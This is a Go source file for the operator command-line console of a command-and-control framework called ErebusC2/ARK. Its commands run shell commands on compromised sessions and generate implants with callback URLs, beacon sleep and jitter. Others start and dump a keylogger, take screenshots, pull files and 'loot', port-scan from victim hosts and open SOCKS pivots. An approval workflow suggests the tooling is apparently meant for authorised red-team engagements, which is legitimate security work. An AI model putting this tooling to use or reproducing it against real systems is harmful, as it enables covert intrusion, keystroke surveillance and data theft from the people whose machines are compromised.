package operatorcli

import (
	"context"
	"fmt"
	"os"
	"strconv"
	"strings"
	"time"

	pb "github.com/KKingZero/ARK/pkg/pb"
	"github.com/KKingZero/ARK/server/builder"
	"google.golang.org/protobuf/proto"
)

type CommandHandler func(args []string) error

type Commands struct {
	client         pb.ErebusC2Client
	approverClient pb.ErebusC2Client
	sessionID      string // active session
	sessionIDs     []string
	// oneShot is set only by ark op. The REPL leaves it false.
	oneShot bool
}

func NewCommands(client pb.ErebusC2Client, approverClient pb.ErebusC2Client) *Commands {
	return &Commands{client: client, approverClient: approverClient}
}

func (c *Commands) approvalClient() pb.ErebusC2Client {
	if c.approverClient != nil {
		return c.approverClient
	}
	return c.client
}

func (c *Commands) Handlers() map[string]CommandHandler {
	handlers := map[string]CommandHandler{}
	for _, d := range commandDescriptors() {
		desc := d
		handlers[desc.Name] = func(args []string) error {
			return desc.Handler(c, args)
		}
	}
	return handlers
}

// ctx returns a context with timeout. The cancel function is called internally
// when the context times out; for short-lived RPCs this is acceptable.
func (c *Commands) ctx() (context.Context, context.CancelFunc) {
	return context.WithTimeout(context.Background(), 60*time.Second)
}

func (c *Commands) taskCtx() (context.Context, context.CancelFunc) {
	return context.WithTimeout(context.Background(), 31*time.Minute)
}

func (c *Commands) requireSession() error {
	if len(c.activeSessions()) == 0 {
		return fmt.Errorf("no active session - use 'use <session-id>'")
	}
	return nil
}

func (c *Commands) requireSingleSession() error {
	if err := c.requireSession(); err != nil {
		return err
	}
	if len(c.activeSessions()) > 1 {
		return fmt.Errorf("multiple sessions selected; this command supports one session")
	}
	return nil
}

func (c *Commands) activeSessions() []string {
	if len(c.sessionIDs) > 0 {
		return c.sessionIDs
	}
	if c.sessionID != "" {
		return []string{c.sessionID}
	}
	return nil
}

func (c *Commands) cmdSessions(_ []string) error {
	ctx, cancel := c.ctx()
	defer cancel()
	resp, err := c.client.ListSessions(ctx, &pb.ListSessionsRequest{})
	if err != nil {
		return err
	}
	if len(resp.Sessions) == 0 {
		fmt.Println("No active sessions")
		return nil
	}
	now := time.Now().Unix()
	fmt.Printf("%-20s %-14s %-12s %-8s %-8s %-6s %s\n",
		"SESSION", "HOSTNAME", "USER", "OS", "XPORT", "ALIVE", "LAST_CHECKIN")
	for _, s := range resp.Sessions {
		alive := "yes"
		if !s.Alive {
			alive = "no"
		}
		age := "n/a"
		if s.LastCheckin > 0 {
			sec := now - s.LastCheckin
			if sec < 0 {
				sec = 0
			}
			if sec < 60 {
				age = fmt.Sprintf("%ds ago", sec)
			} else if sec < 3600 {
				age = fmt.Sprintf("%dm ago", sec/60)
			} else {
				age = fmt.Sprintf("%dh ago", sec/3600)
			}
		}
		sid := s.SessionId
		if len(sid) > 18 {
			sid = sid[:18] + "…"
		}
		fmt.Printf("%-20s %-14s %-12s %-8s %-8s %-6s %s\n",
			sid, s.Hostname, s.Username, s.Os, s.Transport, alive, age)
	}
	return nil
}

func (c *Commands) cmdUse(args []string) error {
	if len(args) < 1 {
		return fmt.Errorf("usage: use <session-id|id,id|all|alive>")
	}
	ids, err := c.resolveSessionSelector(args[0])
	if err != nil {
		return err
	}
	c.sessionID = ""
	c.sessionIDs = nil
	if len(ids) == 1 {
		c.sessionID = ids[0]
		fmt.Printf("Active session: %s\n", c.sessionID)
		return nil
	}
	c.sessionIDs = ids
	fmt.Printf("Active sessions: %s\n", strings.Join(c.sessionIDs, ","))
	return nil
}

func (c *Commands) executeTask(taskType pb.TaskType, data []byte, wait bool) (*pb.ExecuteTaskResponse, error) {
	if err := c.requireSingleSession(); err != nil {
		return nil, err
	}
	return c.executeTaskOnSession(c.activeSessions()[0], taskType, data, wait)
}

func (c *Commands) executeTaskOnSession(sessionID string, taskType pb.TaskType, data []byte, wait bool) (*pb.ExecuteTaskResponse, error) {
	ctx, cancel := c.taskCtx()
	defer cancel()
	if !wait || !c.oneShot {
		return c.client.ExecuteTask(ctx, &pb.ExecuteTaskRequest{
			SessionId: sessionID,
			TaskType:  taskType,
			Data:      data,
			Wait:      wait,
			TimeoutMs: 30000,
		})
	}
	return c.executeWait(ctx, sessionID, taskType, data, 30000)
}

// shellCommandFromArgs joins the shell command. A leading "--" is the
// documented end-of-flags marker (`ark op shell -- id`). Passing it through
// makes /bin/sh treat the command string as an option ("Illegal option --").
func shellCommandFromArgs(args []string) (string, error) {
	if len(args) > 0 && args[0] == "--" {
		args = args[1:]
	}
	if len(args) == 0 || strings.TrimSpace(strings.Join(args, " ")) == "" {
		return "", fmt.Errorf("usage: shell <command>")
	}
	return strings.Join(args, " "), nil
}

func (c *Commands) cmdShell(args []string) error {
	cmd, err := shellCommandFromArgs(args)
	if err != nil {
		return err
	}
	data, _ := proto.Marshal(&pb.ShellTask{Command: cmd})

	if err := c.requireSession(); err != nil {
		return err
	}
	for _, sid := range c.activeSessions() {
		resp, err := c.executeShell(sid, data)
		if len(c.activeSessions()) > 1 {
			fmt.Printf("[%s]\n", sid)
		}
		if err != nil {
			fmt.Printf("Error: %v\n", err)
			continue
		}
		printShellResponse(resp)
		if len(c.activeSessions()) > 1 {
			fmt.Println()
		}
	}
	return nil
}

func (c *Commands) executeShell(sessionID string, data []byte) (*pb.ExecuteTaskResponse, error) {
	ctx, cancel := c.ctx()
	defer cancel()
	return c.executeWait(ctx, sessionID, pb.TaskType_TASK_SHELL, data, 30000)
}

func printShellResponse(resp *pb.ExecuteTaskResponse) {
	if resp == nil || resp.Result == nil {
		return
	}
	if !resp.Result.Success {
		fmt.Printf("Error: %s\n", resp.Result.Error)
		return
	}
	result := &pb.ShellResult{}
	proto.Unmarshal(resp.Result.Data, result)
	if result.Stdout != "" {
		fmt.Print(result.Stdout)
	}
	if result.Stderr != "" {
		fmt.Printf("[stderr] %s", result.Stderr)
	}
}

func printSessionHeader(sessionID string, multi bool) {
	if multi {
		fmt.Printf("[%s]\n", sessionID)
	}
}

func (c *Commands) cmdUpload(args []string) error {
	if len(args) < 2 {
		return fmt.Errorf("usage: upload <local-path> <remote-path>")
	}
	// Read would need os.ReadFile but we keep it simple for CLI
	return fmt.Errorf("upload: use the gRPC API directly for file uploads")
}

func (c *Commands) cmdDownload(args []string) error {
	if len(args) < 1 {
		return fmt.Errorf("usage: download <remote-path>")
	}
	data, _ := proto.Marshal(&pb.FileDownloadTask{RemotePath: args[0]})
	resp, err := c.executeTask(pb.TaskType_TASK_FILE_DOWNLOAD, data, true)
	if err != nil {
		return err
	}
	if resp.Result != nil && resp.Result.Success {
		result := &pb.FileDownloadResult{}
		proto.Unmarshal(resp.Result.Data, result)
		fmt.Printf("Downloaded %s (%d bytes)\n", result.Filename, len(result.Data))
	}
	return nil
}

func (c *Commands) cmdPS(_ []string) error {
	if err := c.requireSession(); err != nil {
		return err
	}
	multi := len(c.activeSessions()) > 1
	for _, sid := range c.activeSessions() {
		printSessionHeader(sid, multi)
		resp, err := c.executeTaskOnSession(sid, pb.TaskType_TASK_PROCESS_LIST, nil, true)
		if err != nil {
			fmt.Printf("Error: %v\n", err)
		} else {
			printProcessListResponse(resp)
		}
		if multi {
			fmt.Println()
		}
	}
	return nil
}

func printProcessListResponse(resp *pb.ExecuteTaskResponse) {
	if resp == nil || resp.Result == nil {
		return
	}
	if !resp.Result.Success {
		fmt.Printf("Error: %s\n", resp.Result.Error)
		return
	}
	result := &pb.ProcessListResult{}
	proto.Unmarshal(resp.Result.Data, result)
	fmt.Printf("%-8s %-8s %-20s %-10s\n", "PID", "PPID", "NAME", "USER")
	for _, p := range result.Processes {
		fmt.Printf("%-8d %-8d %-20s %-10s\n", p.Pid, p.Ppid, p.Name, p.User)
	}
}

func (c *Commands) cmdKill(args []string) error {
	if len(args) < 1 {
		return fmt.Errorf("usage: kill <pid>")
	}
	pid, err := strconv.ParseUint(args[0], 10, 32)
	if err != nil {
		return fmt.Errorf("invalid PID: %s", args[0])
	}
	data, _ := proto.Marshal(&pb.ProcessKillTask{Pid: uint32(pid)})
	resp, err := c.executeTask(pb.TaskType_TASK_PROCESS_KILL, data, true)
	if err != nil {
		return err
	}
	if resp.Result != nil && resp.Result.Success {
		fmt.Printf("Process %d killed\n", pid)
	}
	return nil
}

func (c *Commands) cmdIfconfig(_ []string) error {
	if err := c.requireSession(); err != nil {
		return err
	}
	multi := len(c.activeSessions()) > 1
	for _, sid := range c.activeSessions() {
		printSessionHeader(sid, multi)
		resp, err := c.executeTaskOnSession(sid, pb.TaskType_TASK_NET_IFCONFIG, nil, true)
		if err != nil {
			fmt.Printf("Error: %v\n", err)
		} else {
			printIfconfigResponse(resp)
		}
		if multi {
			fmt.Println()
		}
	}
	return nil
}

func printIfconfigResponse(resp *pb.ExecuteTaskResponse) {
	if resp == nil || resp.Result == nil {
		return
	}
	if !resp.Result.Success {
		fmt.Printf("Error: %s\n", resp.Result.Error)
		return
	}
	result := &pb.NetIfconfigResult{}
	proto.Unmarshal(resp.Result.Data, result)
	for _, iface := range result.Interfaces {
		status := "down"
		if iface.Up {
			status = "up"
		}
		fmt.Printf("%s (%s) MTU=%d %s\n", iface.Name, iface.Mac, iface.Mtu, status)
		for _, addr := range iface.Addresses {
			fmt.Printf("  %s\n", addr)
		}
	}
}

func (c *Commands) cmdPortscan(args []string) error {
	if len(args) < 2 {
		return fmt.Errorf("usage: portscan <target> <port1,port2,...>")
	}
	var ports []uint32
	for _, p := range strings.Split(args[1], ",") {
		port, err := strconv.ParseUint(strings.TrimSpace(p), 10, 32)
		if err != nil {
			return fmt.Errorf("invalid port: %s", p)
		}
		ports = append(ports, uint32(port))
	}
	data, _ := proto.Marshal(&pb.NetPortscanTask{
		Target:    args[0],
		Ports:     ports,
		TimeoutMs: 2000,
		Threads:   10,
	})
	resp, err := c.executeTask(pb.TaskType_TASK_NET_PORTSCAN, data, true)
	if err != nil {
		return err
	}
	if resp.Result != nil && resp.Result.Success {
		result := &pb.NetPortscanResult{}
		proto.Unmarshal(resp.Result.Data, result)
		for _, pr := range result.Ports {
			status := "closed"
			if pr.Open {
				status = "open"
			}
			svc := ""
			if pr.Service != "" {
				svc = " (" + pr.Service + ")"
			}
			fmt.Printf("%s:%d %s%s\n", pr.Host, pr.Port, status, svc)
		}
	}
	return nil
}

func (c *Commands) cmdSleep(args []string) error {
	if len(args) < 1 {
		return fmt.Errorf("usage: sleep <ms> [jitter-pct]")
	}
	ms, err := strconv.ParseInt(args[0], 10, 64)
	if err != nil {
		return fmt.Errorf("invalid sleep ms: %s", args[0])
	}
	if ms < 100 {
		return fmt.Errorf("sleep ms must be >= 100 (got %d)", ms)
	}
	if ms > maxGenerateSleepMs {
		return fmt.Errorf("sleep ms must be <= %d (got %d)", maxGenerateSleepMs, ms)
	}
	var jitter int32
	if len(args) > 1 {
		j, err := strconv.ParseInt(args[1], 10, 32)
		if err != nil {
			return fmt.Errorf("invalid jitter: %s", args[1])
		}
		if j < 0 || j > 100 {
			return fmt.Errorf("jitter must be 0-100 (got %d)", j)
		}
		jitter = int32(j)
	}
	data, _ := proto.Marshal(&pb.SleepTask{SleepMs: ms, JitterPct: jitter})
	resp, err := c.executeTask(pb.TaskType_TASK_SLEEP, data, false)
	if err != nil {
		return err
	}
	fmt.Printf("Sleep task queued: %s (interval=%dms jitter=%d%% — server will advertise this interval)\n",
		resp.TaskId, ms, jitter)
	return nil
}

type generateOpts struct {
	os, arch, format, language, transport string
	cdnDomain, dnsDomain, dnsServer, out  string
	sleepMs                               int64
	jitter                                int32
	callbacks                             []string
	help                                  bool
}

const maxGenerateSleepMs = builder.MaxSleepMs

func parseGenerateArgs(args []string) (generateOpts, error) {
	g := generateOpts{
		os: builder.DefaultOS, arch: builder.DefaultArch, format: string(builder.DefaultFormat),
		language: builder.DefaultLanguage, transport: builder.DefaultTransport, sleepMs: builder.DefaultSleepMs, jitter: builder.DefaultJitterPct,
	}
	for i := 0; i < len(args); i++ {
		a := args[i]
		need := func(flag string) (string, error) {
			if i+1 >= len(args) {
				return "", fmt.Errorf("%s requires a value", flag)
			}
			i++
			return args[i], nil
		}
		switch a {
		case "--os", "-os":
			v, err := need(a)
			if err != nil {
				return g, err
			}
			g.os = v
		case "--arch", "-arch":
			v, err := need(a)
			if err != nil {
				return g, err
			}
			g.arch = v
		case "--format", "-format":
			v, err := need(a)
			if err != nil {
				return g, err
			}
			g.format = v
		case "--sleep", "-sleep", "--sleep-ms", "--callback-time", "--beacon-ms":
			v, err := need(a)
			if err != nil {
				return g, err
			}
			ms, err := strconv.ParseInt(v, 10, 64)
			if err != nil {
				return g, fmt.Errorf("invalid --sleep: %s", v)
			}
			g.sleepMs = ms
		case "--jitter", "-jitter", "--jitter-pct":
			v, err := need(a)
			if err != nil {
				return g, err
			}
			j, err := strconv.ParseInt(v, 10, 32)
			if err != nil {
				return g, fmt.Errorf("invalid --jitter: %s", v)
			}
			g.jitter = int32(j)
		case "--callback", "-callback":
			v, err := need(a)
			if err != nil {
				return g, err
			}
			g.callbacks = append(g.callbacks, v)
		case "--language", "-language", "--lang":
			v, err := need(a)
			if err != nil {
				return g, err
			}
			g.language = v
		case "--out", "-o":
			v, err := need(a)
			if err != nil {
				return g, err
			}
			g.out = v
		case "--transport":
			v, err := need(a)
			if err != nil {
				return g, err
			}
			g.transport = strings.ToLower(v)
		case "--cdn-domain":
			v, err := need(a)
			if err != nil {
				return g, err
			}
			g.cdnDomain = v
		case "--dns-domain":
			v, err := need(a)
			if err != nil {
				return g, err
			}
			g.dnsDomain = v
		case "--dns-server":
			v, err := need(a)
			if err != nil {
				return g, err
			}
			g.dnsServer = v
		case "-h", "--help":
			g.help = true
			return g, nil
		default:
			return g, fmt.Errorf("unknown generate flag %q (use --help)", a)
		}
	}
	if len(g.callbacks) == 0 {
		g.callbacks = []string{builder.DefaultCallback}
	}
	if g.sleepMs < builder.MinSleepMs || g.sleepMs > maxGenerateSleepMs {
		return g, fmt.Errorf("--sleep must be %d-%d ms", builder.MinSleepMs, maxGenerateSleepMs)
	}
	if g.jitter < builder.MinJitterPct || g.jitter > builder.MaxJitterPct {
		return g, fmt.Errorf("--jitter must be %d-%d", builder.MinJitterPct, builder.MaxJitterPct)
	}
	if g.transport != "https" && g.transport != "dns" {
		return g, fmt.Errorf("--transport must be https or dns")
	}
	if g.transport == "dns" && g.dnsDomain == "" {
		return g, fmt.Errorf("--dns-domain required when --transport dns")
	}
	if g.transport != "dns" && (g.dnsDomain != "" || g.dnsServer != "") {
		return g, fmt.Errorf("--dns-domain/--dns-server require --transport dns")
	}
	if g.language == "c" && g.os != "windows" && g.os != "linux" {
		return g, fmt.Errorf("language c supports windows|linux (got %s)", g.os)
	}
	if g.language == "go" && (g.os == "linux" || g.os == "darwin") {
		return g, fmt.Errorf("go implant on %s is archived; use --language c", g.os)
	}
	return g, nil
}

func (c *Commands) cmdGenerate(args []string) error {
	g, err := parseGenerateArgs(args)
	if err != nil {
		return err
	}
	if g.help {
		fmt.Println(`usage: generate [options]
  --os windows|linux|darwin   target OS (default windows)
  --arch amd64|arm64          target arch (default amd64)
  --format exe|dll|shellcode  output format (default exe; C = exe only)
  --sleep ms                  beacon sleep / callback interval (default 500; aliases: --sleep-ms, --callback-time)
  --jitter pct                jitter percent 0-100 (default 10; alias: --jitter-pct)
  --callback URL              C2 callback (repeatable)
  --language c|go             implant language (default c; Windows PE full / Linux basic peer; go for dll/shellcode)
  --out path                  write binary to path (default ./<filename>)`)
		return nil
	}

	ctx, cancel := context.WithTimeout(context.Background(), 6*time.Minute)
	defer cancel()

	fmt.Printf("Building implant language=%s os=%s arch=%s format=%s sleep=%dms …\n",
		g.language, g.os, g.arch, g.format, g.sleepMs)

	resp, err := c.client.GenerateImplant(ctx, &pb.GenerateImplantRequest{
		Os:        g.os,
		Arch:      g.arch,
		Transport: g.transport,
		Callbacks: g.callbacks,
		SleepMs:   g.sleepMs,
		JitterPct: g.jitter,
		Format:    g.format,
		Language:  g.language,
		CdnDomain: g.cdnDomain,
		DnsDomain: g.dnsDomain,
		DnsServer: g.dnsServer,
	})
	if err != nil {
		return err
	}
	if !resp.Success {
		return fmt.Errorf("generate failed: %s", resp.Error)
	}
	outPath := g.out
	if outPath == "" {
		outPath = resp.Filename
		if outPath == "" {
			outPath = "implant.bin"
		}
	}
	if err := os.WriteFile(outPath, resp.Binary, 0o750); err != nil {
		return fmt.Errorf("write %s: %w", outPath, err)
	}
	fmt.Printf("OK build_id=%s format=%s size=%d bytes → %s\n",
		resp.BuildId, resp.Format, len(resp.Binary), outPath)
	if g.language == "go" {
		fmt.Println("OPSEC: Go implants are large (dev/demo). Default generate language is c for Windows engagement PE.")
	}
	return nil
}

func (c *Commands) cmdRegisterSecret(args []string) error {
	if len(args) < 2 {
		return fmt.Errorf("usage: register-secret <implant_id> <secret_hex> [build_id]\n  Registers a per-implant PSK for manual/ldflags builds (64 hex chars)")
	}
	implantID := args[0]
	secretHex := args[1]
	buildID := "manual"
	if len(args) >= 3 {
		buildID = args[2]
	}
	ctx, cancel := c.ctx()
	defer cancel()
	resp, err := c.client.RegisterImplantSecret(ctx, &pb.RegisterImplantSecretRequest{
		ImplantId: implantID,
		SecretHex: secretHex,
		BuildId:   buildID,
	})
	if err != nil {
		return err
	}
	if !resp.Success {
		return fmt.Errorf("%s", resp.Error)
	}
	fmt.Printf("Registered sealed secret for implant %s (build_id=%s)\n", implantID, buildID)
	return nil
}

func (c *Commands) cmdTasks(_ []string) error {
	if err := c.requireSession(); err != nil {
		return err
	}
	ctx, cancel := c.ctx()
	defer cancel()
	resp, err := c.client.ListTasks(ctx, &pb.ListTasksRequest{SessionId: c.sessionID})
	if err != nil {
		return err
	}
	if len(resp.Tasks) == 0 {
		fmt.Println("No tasks")
		return nil
	}
	fmt.Printf("%-20s %-20s\n", "TASK ID", "TYPE")
	for _, t := range resp.Tasks {
		fmt.Printf("%-20s %-20s\n", t.TaskId, t.TaskType)
	}
	return nil
}

func (c *Commands) cmdResult(args []string) error {
	if len(args) < 1 {
		return fmt.Errorf("usage: result <task-id>")
	}
	ctx, cancel := c.ctx()
	defer cancel()
	resp, err := c.client.GetTaskResult(ctx, &pb.GetTaskResultRequest{TaskId: args[0]})
	if err != nil {
		return err
	}
	if resp.Pending {
		fmt.Println("Task is still pending")
		return nil
	}
	if resp.Result != nil {
		fmt.Printf("Success: %v\n", resp.Result.Success)
		if resp.Result.Error != "" {
			fmt.Printf("Error: %s\n", resp.Result.Error)
		}
		fmt.Printf("Execution time: %dms\n", resp.Result.ExecutionTimeMs)
	}
	return nil
}

func (c *Commands) cmdLoot(_ []string) error {
	ctx, cancel := c.ctx()
	defer cancel()
	resp, err := c.client.ListLoot(ctx, &pb.ListLootRequest{SessionId: c.sessionID})
	if err != nil {
		return err
	}
	if len(resp.Items) == 0 {
		fmt.Println("No loot")
		return nil
	}
	for _, item := range resp.Items {
		fmt.Printf("[%s] %s from %s (%d bytes)\n", item.Type, item.Id, item.Source, len(item.Data))
	}
	return nil
}

func (c *Commands) cmdEvents(_ []string) error {
	stream, err := c.client.Subscribe(context.Background(), &pb.SubscribeRequest{})
	if err != nil {
		return err
	}
	fmt.Println("Listening for events (Ctrl+C to stop)...")
	for {
		event, err := stream.Recv()
		if err != nil {
			return err
		}
		fmt.Printf("[%s] %s (session=%s task=%s)\n",
			event.Type, event.Message, event.SessionId, event.TaskId)
	}
}

func (c *Commands) cmdListeners(_ []string) error {
	ctx, cancel := c.ctx()
	defer cancel()
	resp, err := c.client.ListListeners(ctx, &pb.ListListenersRequest{})
	if err != nil {
		return err
	}
	if len(resp.Listeners) == 0 {
		fmt.Println("No listeners")
		return nil
	}
	for _, l := range resp.Listeners {
		active := "inactive"
		if l.Active {
			active = "active"
		}
		fmt.Printf("[%s] %s %s %s (%s)\n", l.Id, l.Name, l.Protocol, l.Address, active)
	}
	return nil
}

func (c *Commands) cmdApprove(args []string) error {
	if len(args) < 1 {
		return fmt.Errorf("usage: approve <approval-id>")
	}
	ctx, cancel := c.ctx()
	defer cancel()
	resp, err := c.approvalClient().Approve(ctx, &pb.ApproveRequest{ApprovalId: args[0]})
	if err != nil {
		return err
	}
	if resp.Success {
		fmt.Println("Approved")
	}
	return nil
}

func (c *Commands) cmdDeny(args []string) error {
	if len(args) < 1 {
		return fmt.Errorf("usage: deny <approval-id> [reason]")
	}
	reason := ""
	if len(args) > 1 {
		reason = strings.Join(args[1:], " ")
	}
	ctx, cancel := c.ctx()
	defer cancel()
	resp, err := c.approvalClient().Deny(ctx, &pb.DenyRequest{ApprovalId: args[0], Reason: reason})
	if err != nil {
		return err
	}
	if resp.Success {
		fmt.Println("Denied")
	}
	return nil
}

func (c *Commands) cmdPending(_ []string) error {
	ctx, cancel := c.ctx()
	defer cancel()
	resp, err := c.approvalClient().ListPendingApprovals(ctx, &pb.ListPendingApprovalsRequest{})
	if err != nil {
		return err
	}
	if len(resp.Approvals) == 0 {
		fmt.Println("No pending approvals")
		return nil
	}
	for _, a := range resp.Approvals {
		fmt.Printf("[%s] %s session=%s type=%s risk=%s\n",
			a.Id, a.TaskDescription, a.SessionId, a.TaskType, a.RiskLevel)
	}
	return nil
}

func (c *Commands) cmdScreenshot(_ []string) error {
	resp, err := c.executeTask(pb.TaskType_TASK_SCREENSHOT, nil, true)
	if err != nil {
		return err
	}
	if resp.Result != nil && resp.Result.Success {
		result := &pb.ScreenshotResult{}
		proto.Unmarshal(resp.Result.Data, result)
		fmt.Printf("Screenshot: %dx%d %s (%d bytes)\n", result.Width, result.Height, result.Format, len(result.ImageData))
	}
	return nil
}

func (c *Commands) cmdKeylog(args []string) error {
	if len(args) < 1 {
		return fmt.Errorf("usage: keylog <start|stop|dump>")
	}
	switch args[0] {
	case "start":
		data, _ := proto.Marshal(&pb.KeylogStartTask{CaptureWindowTitles: true})
		_, err := c.executeTask(pb.TaskType_TASK_KEYLOG_START, data, false)
		if err != nil {
			return err
		}
		fmt.Println("Keylogger started")
	case "stop":
		_, err := c.executeTask(pb.TaskType_TASK_KEYLOG_STOP, nil, false)
		if err != nil {
			return err
		}
		fmt.Println("Keylogger stopped")
	case "dump":
		resp, err := c.executeTask(pb.TaskType_TASK_KEYLOG_DUMP, nil, true)
		if err != nil {
			return err
		}
		if resp.Result != nil && resp.Result.Success {
			result := &pb.KeylogDumpResult{}
			proto.Unmarshal(resp.Result.Data, result)
			for _, entry := range result.Entries {
				fmt.Printf("[%s] %s\n", entry.WindowTitle, entry.Keys)
			}
		}
	default:
		return fmt.Errorf("usage: keylog <start|stop|dump>")
	}
	return nil
}

func (c *Commands) cmdSocks(args []string) error {
	if len(args) < 1 {
		return fmt.Errorf("usage: socks <start|stop> [--port 1080]")
	}
	switch strings.ToLower(args[0]) {
	case "start":
		port := uint32(1080)
		if err := parseKVFlags(args[1:], map[string]func(string){
			"--port": func(v string) {
				n, err := strconv.ParseUint(v, 10, 32)
				if err == nil && n > 0 {
					port = uint32(n)
				}
			},
		}); err != nil {
			return err
		}
		return c.runTypedTask(pb.TaskType_TASK_SOCKS_START, &pb.SocksStartTask{Port: port}, true, printTypedResult)
	case "stop":
		return c.runTypedTask(pb.TaskType_TASK_SOCKS_STOP, &pb.SocksStopTask{}, true, printTypedResult)
	default:
		return fmt.Errorf("usage: socks <start|stop> [--port 1080]")
	}
}

func (c *Commands) cmdInject(args []string) error {
	return fmt.Errorf("inject: use the gRPC API directly for binary injection payloads")
}

func (c *Commands) cmdExit(_ []string) error {
	fmt.Println("Goodbye")
	return errExit
}

var errExit = fmt.Errorf("exit")

func (c *Commands) cmdHelp(_ []string) error {
	fmt.Println("Commands:")
	for _, d := range commandDescriptors() {
		fmt.Printf("  %-78s - %s\n", d.Usage, d.Help)
	}
	return nil
}
